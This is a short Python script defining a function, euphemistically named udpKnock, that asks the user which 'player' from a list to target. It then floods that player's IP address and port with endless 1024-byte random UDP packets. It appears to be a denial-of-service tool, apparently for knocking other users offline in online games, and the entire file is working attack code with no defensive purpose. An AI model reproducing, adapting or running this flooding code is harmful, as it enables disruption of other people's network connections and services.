import socket
import random
import netCore

def udpKnock(canidateList):
    player = input("[?] Enter number of player to knock: ")
    try:
        player = int(player)-1
    except ValueError:
        print("[-] Invalid input, defaulting to 1!")
        player = 0

    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket

    ip, port = netCore.decompIP(canidateList[player])
    print("[+] Knock sequence initiated on {}:{}".format(ip,port))

    port = int(port)

    while True:
        bytes=random._urandom(1024)
        sock.sendto(bytes,(ip,port))

# udpKnock()

    